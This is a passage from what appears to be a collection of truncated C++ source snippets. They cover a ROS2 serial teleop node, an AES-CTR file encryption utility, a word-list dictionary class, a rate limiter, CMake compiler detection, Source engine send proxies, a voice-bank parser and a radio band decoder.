Port....\");\n        close(serial_port);\n    }\n    TeleopSTMNOde() : Node(\"TeleopSTMNOde\") // Create a node with name stated\n    {\n        const char *portname = \"/dev/ttyUSB0\";\n        serialPort = openSerialPort(portname);\n        if (!configureSerialPort(serialPort, B115200))\n        {\n            RCLCPP_INFO(this->get_logger(), \"Closing Serial Port....\");\n            // closeSerialPort(serialPort);\n        }\n\n        subscriber_ = this->create_subscription<geometry_msgs::msg::Twist>(\n            \"/cmd_vel\", 10, std::bind(&TeleopSTMNOde::sub_callBack, this, std::placeholders::_1));\n    }\n\nprivate:\n    void sub_callBack(const geometry_msgs::msg::Twist::SharedPtr data)\n    {\n        RCLCPP_INFO(this->get_logger(), \"Callback triggered.\");\n        RCLCPP_INFO(this->get_logger(), \"L",
    "\n\n\n#include <iostream>\n#include <string>\n#include <vector>\n#include <random>\n#include <sstream>\n#include <iomanip>\n#include <algorithm>\n#include <iterator>\n#include <fstream>\n#include <chrono>\n#include \"cryptopp/aes.h\"\n#include \"cryptopp/modes.h\"\n#include \"cryptopp/filters.h\"\n#include \"cryptopp/sha.h\"\n#include \"cryptopp/hex.h\"\n#include <cstdlib>\n\n\n\nusing namespace CryptoPP;\n\n\n\nconst size_t chunkSize = 1000 * 1024 * 1024;\n\n\n\nvoid updateHash(SHA256& hash, std::vector<byte>& buffer, std::vector<byte>& processedData, size_t bytesRead, bool isEncrypt);\nvoid processFile(const std::string& input_path, const std::string& output_path, bool isEncrypt);\nvoid encrypt(const std::string& input_path, const std::string& output_path);\nvoid decrypt(const std::string& input_path, const std::string& output_path);\nvoid generateSeed();\n\nstd::string generateRandomString(std::mt19937& generator, size_t length);\nstd::string buildKey();\nstd::string buildIV();\n\n\n\nint main(int argc, char* argv[]) {\n\n    if (argc != 4) {\n        std::cerr << \"Uso: \" << argv[0] << \" <operation> <input_path> <output_path>\" << std::endl;\n        return 1;\n    }\n\n    std::string operation = argv[1];\n    std::string input_path = argv[2];\n    std::string output_path = argv[3];\n\n    if (operation == \"encrypt\") {\n        encrypt(input_path, output_path);\n    }\n    else if (operation == \"decrypt\") {\n        decrypt(input_path, output_path);\n    }\n    else {\n        std::cerr << \"Operaci\ufffdn no v\ufffdlida: \" << operation << std::endl;\n        return 1;\n    }\n    return 0;\n}\n\n\n\nvoid updateHash(SHA256& hash, std::vector<byte>& buffer, std::vector<byte>& processedData, size_t bytesRead, bool isEncrypt) {\n    if (isEncrypt) {\n        hash.Update(buffer.data(), bytesRead);\n    }\n    else {\n        hash.Update(processedData.data(), bytesRead);\n    }\n}\n\n\n\nvoid processFile(const std::string& input_path, const std::string& output_path, bool isEncrypt) {\n    try {\n        std::string key = buildKey();\n        std::string iv = buildIV();\n        std::ifstream inFile(input_path, std::ios::binary);\n        std::ofstream outFile(output_path, std::ios::binary);\n\n        if (!inFile.is_open() || !outFile.is_open()) {\n            std::cerr << \"Error abriendo los archivos\" << std::endl;\n            return;\n        }\n\n        CTR_Mode<AES>::Encryption encryptor;\n        CTR_Mode<AES>::Decryption decryptor;\n        if (isEncrypt) {\n            encryptor.SetKeyWithIV((const byte*)key.data(), 32, (const byte*)iv.data());\n        }\n        else {\n            decryptor.SetKeyWithIV((const byte*)key.data(), 32, (const byte*)iv.data());\n        }\n\n        std::vector<byte> buffer(chunkSize);\n        SHA256 hash;\n\n        while (inFile) {\n            inFile.read(reinterpret_cast<char*>(buffer.data()), chunkSize);\n            std::streamsize bytesRead = inFile.gcount();\n\n            if (bytesRead > 0) {\n                std::vector<byte> processedData(bytesRead);\n                if (isEncrypt) {\n                    updateHash(hash, buffer, processedData, bytesRead, true);\n                    encryptor.ProcessData(processedData.data(), buffer.data(), bytesRead);\n                }\n                else {\n                    decryptor.ProcessData(processedData.data(), buffer.data(), bytesRead);\n                    updateHash(hash, buffer, processedData, bytesRead, false);\n                }\n                outFile.write(reinterpret_cast<char*>(processedData.data()), bytesRead);\n            }\n        }\n\n        inFile.close();\n        outFile.close();\n\n        byte digest[CryptoPP::SHA256::DIGESTSIZE];\n        hash.Final(digest);\n        std::string hashResult;\n        CryptoPP::HexEncoder encoder(new CryptoPP::StringSink(hashResult));\n        encoder.Put(digest, sizeof(digest));\n        encoder.MessageEnd();\n\n        if (isEncrypt) {\n            std::ofstream outHashFile(\"hash.bin\", std::ios::binary);\n            if (!outHashFile) {\n                std::cerr << \"No se pudo crear el archivo de integridad\" << std::endl;\n                return;\n            }\n            size_t length = hashResult.size();\n            outHashFile.write(reinterpret_cast<const char*>(&length), sizeof(length));\n            outHashFile.write(hashResult.c_str(), length);\n            outHashFile.close();\n        }\n        else {\n            std::ifstream inHashFile(\"hash.bin\", std::ios::binary);\n            size_t length = 64;\n            if (!inHashFile) {\n                std::cerr << \"No se pudo acceder al archivo de integridad\" << std::endl;\n                return;\n            }\n            inHashFile.read(reinterpret_cast<char*>(&length), sizeof(length));\n            std::string calculatedHash(length, '\\0');\n            inHashFile.read(&calculatedHash[0], length);\n            inHashFile.close();\n\n            if (hashResult != calculatedHash) {\n                std::cerr << \"La imagen ha sido alterada durante su envio!!\" << std::endl;\n                return;\n            }\n        }\n    }\n    catch (const Exception& e) {\n      ",
    "//\n//  DictionarySegment.cpp\n//\n\n#include \"DictionarySegment.h\"\n\nnamespace cs31\n{\n\n// segments have a required length and are not inflated at first\nDictionarySegment::DictionarySegment( int requiredLength ) : mInflated( false ), mValue( ' ' ), mRequiredLength( requiredLength )\n{\n    \n}\n\nvoid DictionarySegment::setRequiredLength( int i )\n{\n    mRequiredLength = i;\n}\n\nvoid DictionarySegment::forWhichValues( char c )\n{\n    mValue = c;\n}\n\nbool DictionarySegment::hasValues( char c )\n{\n    return( mValue == c );\n}\n\n// search the segment for a particular word\n// all words in a segment start with the mValue letter so filter first on that\nbool DictionarySegment::lookup( std::string s )\n{\n    bool result = false;\n    // to search, this segment must be inflated first\n    if (!mInflated)\n    {\n        inflate();\n        mInflated = true;\n    }\n    if (s.length() == mRequiredLength && s[0] == mValue)\n    {\n        auto locate = mSegment.find( s );\n        if (locate != mSegment.end())\n        {\n            result = true;\n        }\n    }\n    return( result );\n}\n\n// select the word found at a particular position\n// this is used to randomly pick a word\nstd::string DictionarySegment::valueAt( int spot )\n{\n    std::string result;\n    // to search, this segment must be inflated first\n    if (!mInflated)\n    {\n        inflate();\n        mInflated = true;\n    }\n    int i = 0;\n    bool keepGoing = true;\n    while( keepGoing )\n    {\n        for(std::set< std::string >::const_iterator iter = mSegment.cbegin();\n            iter != mSegment.cend();\n            iter++)\n        {\n            if (i == spot)\n            {\n                result = *iter;\n                keepGoing = false;\n                break;\n            }\n            i++;\n        }\n    }\n    return( result ); // just for now...\n}\n\n// toss out the in-memory database\nvoid DictionarySegment::deflate()\n{\n    if (mInflated)\n    {\n        mSegment.clear();\n    }\n}\n\n// build the in-memory database\n// this is the curated set of five letter words broken out by first letter\nvoid DictionarySegment::inflate()\n{\n    switch( mValue )\n    {\n        case 'a':\n            mSegment.insert( \"aargh\" );\n            mSegment.insert( \"aaron\" );\n            mSegment.insert( \"abaca\" );\n            mSegment.insert( \"abaci\" );\n            mSegment.insert( \"aback\" );\n            mSegment.insert( \"abama\" );\n            mSegment.insert( \"abase\" );\n            mSegment.insert( \"abash\" );\n            mSegment.insert( \"abask\" );\n            mSegment.insert( \"abate\" );\n            mSegment.insert( \"abave\" );\n            mSegment.insert( \"abaze\" );\n            mSegment.insert( \"abbey\" );\n            mSegment.insert( \"abbes\" );\n            mSegment.insert( \"abbie\" );\n            mSegment.insert( \"abbot\" );\n            mSegment.insert( \"abdal\" );\n            mSegment.insert( \"abeam\" );\n            mSegment.insert( \"abear\" );\n            mSegment.insert( \"abend\" );\n            mSegment.insert( \"aberr\" );\n            mSegment.insert( \"abets\" );\n            mSegment.insert( \"abhor\" );\n            mSegment.insert( \"abide\" );\n            mSegment.insert( \"abysm\" );\n            mSegment.insert( \"abyss\" );\n            mSegment.insert( \"abkar\" );\n            mSegment.insert( \"abler\" );\n            mSegment.insert( \"ables\" );\n            mSegment.insert( \"ablow\" );\n            mSegment.insert( \"abner\" );\n            mSegment.insert( \"abnet\" );\n            mSegment.insert( \"abode\" );\n            mSegment.insert( \"abody\" );\n            mSegment.insert( \"aboil\" );\n            mSegment.insert( \"aboon\" );\n            mSegment.insert( \"abort\" );\n            mSegment.insert( \"abote\" );\n            mSegment.insert( \"about\" );\n            mSegment.insert( \"above\" );\n            mSegment.insert( \"abram\" );\n            mSegment.insert( \"absis\" );\n            mSegment.insert( \"abuse\" );\n            mSegment.insert( \"abush\" );\n            mSegment.insert( \"abuts\" );\n            mSegment.insert( \"abuzz\" );\n            mSegment.insert( \"acast\" );\n            mSegment.insert( \"acate\" );\n            mSegment.insert( \"accel\" );\n            mSegment.insert( \"accoy\" );\n            mSegment.insert( \"accra\" );\n            mSegment.insert( \"achoo\" );\n            mSegment.insert( \"achor\" );\n            mSegment.insert( \"acidy\" );\n            mSegment.insert( \"acids\" );\n            mSegment.insert( \"acing\" );\n            mSegment.insert( \"acned\" );\n            mSegment.insert( \"acnes\" );\n            mSegment.insert( \"acock\" );\n            mSegment.insert( \"acoin\" );\n            mSegment.insert( \"acold\" );\n            mSegment.insert( \"acoma\" );\n            mSegment.insert( \"acone\" );\n            mSegment.insert( \"acool\" );\n            mSegment.insert( \"acorn\" );\n            mSegment.insert( \"acost\" );\n            mSegment.insert( \"acoup\" );\n            mSegment.insert( \"acres\" );\n            mSegment.insert( \"acrid\" );\n            mSegment.insert( \"acrux\" );\n            mSegment.insert( \"acted\" );\n            mSegment.insert( \"actin\" );\n",
    "/*\n * Copyright (c) Meta Platforms, Inc. and affiliates.\n *\n * This source code is licensed under the MIT license found in the\n * LICENSE file in the root directory of this source tree.\n */\n\n#include \"bistro/bistro/processes/AsyncReadPipeRateLimiter.h\"\n\nnamespace facebook { namespace bistro {\n\nvoid AsyncReadPipeRateLimiter::reduceQuotaBy(Quota how_much) {\n  Quota next = quota_ - how_much;\n  if (next <= 0 && quota_ > 0) {  // Quota just ran out\n    for (auto&& pipe : pipes_) {\n      pipe->pause();\n    }\n  }\n  if (next < quota_) {  // Avoid underflow, ignore negative decrements\n    quota_ = next;\n  }\n}\n\nvoid AsyncReadPipeRateLimiter::timeoutExpired() noexcept {\n  // Increase the quota and resume all pipes if it becomes positive,\n  Quota next = quota_ + quotaPerPollInterval_;\n  if (quota_ <= 0 && next > 0) {\n    for (auto&& pipe : pipes_) {\n      pipe->resume();  // reduceQuotaBy() pauses the pipes.\n    }\n  }\n  // This check prevents quota overflow, and, if the increment is not\n  // positive, effectively disables the quota.\n  quota_ = (next > quota_) ? next : std::numeric_limits<Quota>::max();\n  scheduleTimeout(pollEveryMs_);\n}\n\n}}  // namespace facebook::bistro\n",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n# if defined(__INTEL_COMPILER_UPDATE)\n#  define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n# else\n#  define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n  /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ = VVRP + 1100 */\n# define COMPILER_VERSION_MAJOR DEC((__WATCOMC__ - 1100) / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__SUNPRO_CC)\n# define COMPILER_ID \"SunPro\"\n# if __SUNPRO_CC >= 0x5100\n   /* __SUNPRO_CC = 0xVRRP */\n#  define COMPILER_VERSION_MAJOR HEX(__SUNPRO_CC>>12)\n#  define COMPILER_VERSION_MINOR HEX(__SUNPRO_CC>>4 & 0xFF)\n#  define COMPILER_VERSION_PATCH HEX(__SUNPRO_CC    & 0xF)\n# else\n   /* __SUNPRO_CC = 0xVRP */\n#  define COMPILER_VERSION_MAJOR HEX(__SUNPRO_CC>>8)\n#  define COMPILER_VERSION_MINOR HEX(__SUNPRO_CC>>4 & 0xF)\n#  define COMPILER_VERSION_PATCH HEX(__SUNPRO_CC    & 0xF)\n# endif\n\n#elif defined(__HP_aCC)\n# define COMPILER_ID \"HP\"\n  /* __HP_aCC = VVRRPP */\n# define COMPILER_VERSION_MAJOR DEC(__HP_aCC/10000)\n# define COMPILER_VERSION_MINOR DEC(__HP_aCC/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__HP_aCC     % 100)\n\n#elif defined(__DECCXX)\n# define COMPILER_ID \"Compaq\"\n  /* __DECCXX_VER = VVRRTPPPP */\n# define COMPILER_VERSION_MAJOR DEC(__DECCXX_VER/10000000)\n# define COMPILER_VERSION_MINOR DEC(__DECCXX_VER/100000  % 100)\n# define COMPILER_VERSION_PATCH DEC(__DECCXX_VER         % 10000)\n\n#elif defined(__IBMCPP__) && defined(__COMPILER_VER__)\n# define COMPILER_ID \"zOS\"\n  /* __IBMCPP__ = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__IBMCPP__/100)\n# define COMPILER_VERSION_MINOR DEC(__IBMCPP__/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__IBMCPP__    % 10)\n\n#elif defined(__ibmxl__) && defined(__clang__)\n# define COMPILER_ID \"XLClang\"\n# define COMPILER_VERSION_MAJOR DEC(__ibmxl_version__)\n# define COMPILER_VERSION_MINOR DEC(__ibmxl_release__)\n# define COMPILER_VERSION_PATCH DEC(__ibmxl_modification__)\n# define COMPILER_VERSION_TWEAK DEC(__ibmxl_ptf_fix_level__)\n\n\n#elif defined(__IBMCPP__) && !defined(__COMPILER_VER__) && __IBMCPP__ >= 800\n# define COMPILER_ID \"XL\"\n  /* __IBMCPP__ = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__IBMCPP__/100)\n# define COMPILER_VERSION_MINOR DEC(__IBMCPP_",
    "//========= Copyright Valve Corporation, All rights reserved. ============//\n//\n// Purpose: implements various common send proxies\n//\n// $NoKeywords: $\n//=============================================================================//\n\n#include \"cbase.h\"\n#include \"sendproxy.h\"\n#include \"basetypes.h\"\n#include \"baseentity.h\"\n#include \"team.h\"\n#include \"player.h\"\n\n// memdbgon must be the last include file in a .cpp file!!!\n#include \"tier0/memdbgon.h\"\n\nvoid SendProxy_Color32ToInt( const SendProp *pProp, const void *pStruct, const void *pData, DVariant *pOut, int iElement, int objectID )\n{\n\tcolor32 *pIn = (color32*)pData;\n\t*((unsigned int*)&pOut->m_Int) = ((unsigned int)pIn->r << 24) | ((unsigned int)pIn->g << 16) | ((unsigned int)pIn->b << 8) | ((unsigned int)pIn->a);\n}\n\nvoid SendProxy_EHandleToInt( const SendProp *pProp, const void *pStruct, const void *pVarData, DVariant *pOut, int iElement, int objectID)\n{\n\tCBaseHandle *pHandle = (CBaseHandle*)pVarData;\n\n\tif ( pHandle && pHandle->Get() )\n\t{\n\t\tint iSerialNum = pHandle->GetSerialNumber() & (1 << NUM_NETWORKED_EHANDLE_SERIAL_NUMBER_BITS) - 1;\n\t\tpOut->m_Int = pHandle->GetEntryIndex() | (iSerialNum << MAX_EDICT_BITS);\n\t}\n\telse\n\t{\n\t\tpOut->m_Int = INVALID_NETWORKED_EHANDLE_VALUE;\n\t}\n}\n\nvoid SendProxy_IntAddOne( const SendProp *pProp, const void *pStruct, const void *pVarData, DVariant *pOut, int iElement, int objectID)\n{\n\tint *pInt = (int *)pVarData;\n\n\tpOut->m_Int = (*pInt) + 1;\n}\n\nvoid SendProxy_ShortAddOne( const SendProp *pProp, const void *pStruct, const void *pVarData, DVariant *pOut, int iElement, int objectID)\n{\n\tshort *pInt = (short *)pVarData;\n\n\tpOut->m_Int = (*pInt) + 1;\n}\n\nSendProp SendPropBool(\n\tconst char *pVarName,\n\tint offset,\n\tint sizeofVar )\n{\n\tAssert( sizeofVar == sizeof( bool ) );\n\treturn SendPropInt( pVarName, offset, sizeofVar, 1, SPROP_UNSIGNED );\n}\n\n\nSendProp SendPropEHandle(\n\tconst char *pVarName,\n\tint offset,\n\tint sizeofVar,\n\tint flags,\n\tSendVarProxyFn proxyFn )\n{\n\treturn SendPropInt( pVarName, offset, sizeofVar, NUM_NETWORKED_EHANDLE_BITS, SPROP_UNSIGNED|flags, proxyFn );\n}\n\nSendProp SendPropIntWithMinusOneFlag( const char *pVarName, int offset, int sizeofVar, int nBits, SendVarProxyFn proxyFn )\n{\n\treturn SendPropInt( pVarName, offset, sizeofVar, nBits, SPROP_UNSIGNED, proxyFn );\n}\n\n//-----------------------------------------------------------------------------\n// Purpose: Proxy that only sends data to team members\n// Input  : *pStruct - \n//\t\t\t*pData - \n//\t\t\t*pOut - \n//\t\t\tobjectID - \n// Output : Returns true on success, false on failure.\n//-----------------------------------------------------------------------------\nvoid* SendProxy_OnlyToTeam( const SendProp *pProp, const void *pStruct, const void *pVarData, CSendProxyRecipients *pRecipients, int objectID )\n{\n\tCBaseEntity *pEntity = (CBaseEntity*)pStruct;\n\tif ( pEntity )\n\t{\n\t\tCTeam *pTeam = pEntity->GetTeam();\n\t\tif ( pTeam )\n\t\t{\n\t\t\tpRecipients->ClearAllRecipients();\n\t\t\tfor ( int i=0; i < pTeam->GetNumPlayers(); i++ )\n\t\t\t\tpRecipients->SetRecipient( pTeam->GetPlayer( i )->GetClientIndex() );\n\t\t\n\t\t\treturn (void*)pVarData;\n\t\t}\n\t}\n\n\treturn NULL;\n}\nREGISTER_SEND_PROXY_NON_MODIFIED_POINTER( SendProxy_OnlyToTeam );\n\n#define TIME_BITS 24\n\n// This table encodes edict data.\nstatic void SendProxy_Time( const SendProp *pProp, const void *pStruct, const void *pVarData, DVariant *pOut, int iElement, int objectID )\n{\n\tfloat clock_base = floor( gpGlobals->curtime );\n\tfloat t = *( float * )pVarData;\n\tfloat dt = t - clock_base;\n\tint addt = Floor2Int( 1000.0f * dt + 0.5f );\n\t// TIME_BITS bits gives us TIME_BITS-1 bits plus sign bit\n\tint maxoffset = 1 << ( TIME_BITS - 1);\n\n\taddt = clamp( addt, -maxoffset, maxoffset );\n\n\tpOut->m_Int = addt;\n}\n\n//-----------------------------------------------------------------------------\n// Purpose: \n// Input  : *pVarName - \n//\t\t\tsizeofVar - \n//\t\t\tflags - \n//\t\t\tpId - \n// Output : SendProp\n//-----------------------------------------------------------------------------\nSendProp SendPropTime(\n\tconst char *pVarName,\n\tint offset,\n\tint sizeofVar )\n{\n//\treturn SendPropInt( pVarName, offset, sizeofVar, TIME_BITS, 0, SendProxy_Time );\n\t// FIXME:  Re-enable above when it doesn't cause lots of deltas\n\treturn SendPropFloat( pVarName, offset, sizeofVar, -1, SPROP_NOSCALE );\n}\n\n#if !defined( NO_ENTITY_PREDICTION )\n\n#define PREDICTABLE_ID_BITS 31\n\n//-----------------------------------------------------------------------------\n// Purpose: Converts a predictable Id to an integer\n// Input  : *pStruct - \n//\t\t\t*pVarData - \n//\t\t\t*pOut - \n//\t\t\tiElement - \n//\t\t\tobjectID - \n//-----------------------------------------------------------------------------\nstatic void SendProxy_PredictableIdToInt( const SendProp *pProp, const void *pStruct, const void *pVarData, DVariant *pOut, int iElement, int objectID )\n{\n\tCPredictableId* pId = ( CPredictableId * )pVarData;\n\tif ( pId )\n\t{\n\t\tpOut->m_Int = pId->GetRaw();\n\t}\n\telse\n\t{\n\t\tpOut->m_Int = 0;\n\t}\n}\n\n//--------------------------------------------------------------",
    "#include \"stdafx.h\"\n#include \"ddi.h\"\n#include <QtCore\\qstringlist.h>\n#include <QtCore\\qfile.h>\n#include <QtCore\\qdir.h>\n#include \"chunk/basechunk.h\"\n#include \"chunk/chunkcreator.h\"\n#include <QtCore/qcryptographichash.h>\n\n#define SETERROR(x) std::string err_str=x.toLatin1();*error=new char[err_str.size()+1];std::copy(err_str.begin(),err_str.end(),*error);(*error)[err_str.size()]='\\0';\n#define FRET(x) ddi.close();ddb.close();mTreeRoot->~BaseChunk();return x;\n\nstatic BaseChunk* SearchForChunkByPath(QString path,\n    BaseChunk* mTreeRoot = nullptr,BOOL bSlience=TRUE)\n{\n\tQStringList paths=QString(path).split(',');\n    BaseChunk* baseSearchChunk = mTreeRoot;\n    if(baseSearchChunk == nullptr) {\n\t\tif(!bSlience)\n\t\t\tQMsgBox(nullptr, (\"No root\"), (\"Tree root chunk is non existent.\"));\n        return nullptr;\n    }\n    foreach(auto i, paths) {\n        if(i.isEmpty()) {\n\t\t\tif(!bSlience)\n\t\t\t\tQMsgBox(nullptr, (\"Invalid pattern\"), (\"Empty name in path chain.\"));\n            return nullptr;\n        }\n        baseSearchChunk = baseSearchChunk->GetChildByName(i);\n        if(baseSearchChunk == nullptr) {\n\t\t\tif(!bSlience)\n\t\t\t\tQMsgBox(nullptr, (\"Specified chunk not found\"), QString(\"Search for \\\"%1\\\" returned nothing.\").arg(i).toLatin1());\n            return nullptr;\n        }\n    }\n\n    return baseSearchChunk;\n}\nstatic BaseChunk* ParseDdi(QString path)\n{\n    FILE *file;\n\tfopen_s(&file,path.toLocal8Bit(), \"rb\");\n    if(!file) {\n        return nullptr;\n    }\n\n    // Read signature first\n    fpos_t pos;\n    char signatureBuf[4];\n    fgetpos(file, &pos);\n    // Skip Leading QWORD if needed\n    if(BaseChunk::HasLeadingQword) fseek(file, 8, SEEK_CUR);\n    fread(signatureBuf, 1, 4, file);\n    fsetpos(file, &pos);\n\n    auto sig = QByteArray(signatureBuf, 4);\n    auto chunk = ChunkCreator::Get()->ReadFor(\"DBSe\", file);\n\n    fclose(file);\n\n    return chunk;\n}\n\n#define VSS_STA 0\n#define VSS_DIPHONE 1\n#define VSS_TRIPHONE 2\n#define FILL256STR(x,y,z) strncpy(&x[256*z], y.toLatin1(),min(256,y.length()));\n\n\nvoid FreeDDI(VoiceSampleStruct * array) {\n    delete[] array;\n}\n\n#define BYTE2SEC(x) (float)(x * 8.0) / (vss.sndSampleRate * 16.0 * vss.sndChannel)\n#define FRAME2BYTE(x) (256*x*2)\n\n\nBOOL HashDDI(char* ddiFile, char** ddiHash) {\n    QString ddiPath = QString(ddiFile);\n    QString ddbPath = ddiPath.section('.', 0, -2) + \".ddb\";\n    {\n        QFile ddi(ddiPath);\n        if (!ddi.open(QFile::ReadOnly)) {\n            return FALSE;\n        }\n        {\n            QCryptographicHash hash(QCryptographicHash::Md5);\n            if (hash.addData(&ddi)) {\n                QByteArray result = hash.result();\n                QString x = QString(result.toHex());\n                std::string err_str = x.toLatin1();\n                *ddiHash = new char[err_str.size() + 1];\n                std::copy(err_str.begin(), err_str.end(), *ddiHash);\n                (*ddiHash)[err_str.size()] = '\\0';\n            }\n        }\n        ddi.close();\n    }\n    return TRUE;\n}\n\nstatic QString PEncode(QString input)\n{\n    QString ret;\n    for (QChar c : input) {\n        if (c >= 'a' && c <= 'z')\n        {\n            ret += c;\n        }\n        else if (c >= 'A' && c <= 'Z')\n        {\n            ret += '[' + c + ']';\n        }\n        else if (c >= '0' && c <= '9')\n        {\n            ret += c;\n        }\n        else if (c == ' ')\n        {\n            ret += \"[%20]\";\n        }\n        else if (c < ' ' || c>'}' || \n            c == '\\\\' ||\n            c == '/'  ||\n            c == ':' ||\n            c == '*' ||\n            c == '?' ||\n            c == '<' ||\n            c == '>' ||\n            c == '|' ||\n            c == '[' ||\n            c == ']' ||\n            c == '-' ||\n            c == '.' ||\n            c == '\"'\n            )\n        {\n            ret += '[' + QString::number(c.toLatin1()) + ']';\n        }\n        else\n            ret += c;\n    }\n    return ret;\n}\n\nstatic bool IsEvecSymbol(QString Symbol)\n{\n    if(Symbol == \"*\") return TRUE;\n    if(Symbol == \"?\") return TRUE;\n    if (Symbol.length() >= 3)\n    {\n        QChar Si = Symbol.at(Symbol.length() - 1);\n        QChar SS = Symbol.at(Symbol.length() - 2);\n        if (SS != '#')return FALSE;\n        if (Si == '1' ||\n            Si == '2' ||\n            Si == '3' ||\n            Si == '4' ||\n            Si == '5' ||\n            Si == '6' ||\n            Si == '+' ||\n            Si == '-' ||\n            Si == 'F'\n            )return TRUE;\n        return FALSE;;\n    }\n    return FALSE;\n}\n\n#define PST_IS_REST(x) x.toLower()==\"sil\" || x.toLower()==\"asp\"\nVoiceSampleStruct * AnalysisDDI(char* ddiFile, char** error, int* vss_size) {\n    QString ddiPath = QString(ddiFile);\n    QString ddbPath = ddiPath.section('.', 0, -2) + \".ddb\";\n\n    //Check If File Readable\n    {\n        QFile ddi(ddiPath);\n        if (!ddi.open(QFile::ReadOnly)) {\n            SETERROR(\"Cannot open target DDI \" + ddiPath);\n            return NULL;\n        }\n        ddi.close();\n        QFile ddb(ddbPath);\n        if (!ddb.open(QFile::ReadOnly)) {\n     ",
    "//\n// BT_USB_CIV_Band_Decoder.cpp\n//\n\n#include <Update.h>\n#include \"FS.h\"\n#include <SPI.h>\n#include <SD.h>\n#include <stdint.h>\n#include \"CIV.h\"\n#include \"M5StampC3U_Decoder.h\"\n#include \"BLE.h\"\n#include \"Decoder.h\"\n#include \"time.h\"\n#include \"TimeLib.h\"\n\n//#define SEE_RAW_RX // see raw hex messages from radio\n//#define SEE_RAW_TX // see raw hex messages from radio\n\n//extern bool XVTR_enabled;\nvoid UpdateFromFS(fs::FS &fs);\nvoid printDirectory(File dir, int numTabs);\nextern struct cmdList cmd_List[];\nextern const struct Modes_List modeList[];\n\n/*  copy of struct here from header file for easy reference.\nstruct Bands {\n  char band_name[6];    // Freindly name or label.  Default here but can be changed by user.\n  uint64_t edge_lower;  // band edge limits for TX and for when to change to next band when tuning up or down.\n  uint64_t edge_upper;\n  uint64_t Xvtr_offset;  // Offset to add to radio frequency.\n                         // When all is correct, it will be within the band limits and allow PTT and Band decoder outputs\n  uint64_t VFO_last;     // store the last used frequency on each band.\n                         // for XVTR bands subtract the LO offset and send the result to the radio\n  uint8_t mode_idx;      // current mode stored as indexc to the modelist table.\n  uint8_t filt;          // current fiult soreds in teh modelist table\n  uint8_t datamode;\n  uint8_t agc;            // store last agc.  Some radio/band/mode combos only have 1.\n  uint8_t preamp;         // some bands there is no preamp (2.4G+ on 905).  Some radios/bands/modes combos have 1 preamp level, others have 2 levels.\n  uint8_t atten;          // some bands there is no atten (some on 905).  Some radios/bands/mode combos have 1 atten level, others have more. \n};\n*/\n\nstruct Bands bands[NUM_OF_BANDS] = {\n  { \"AM\", 535000, 1705000, 0, 535000, 1, 1, 0, 1, 0, 0 },      // AM\n  { 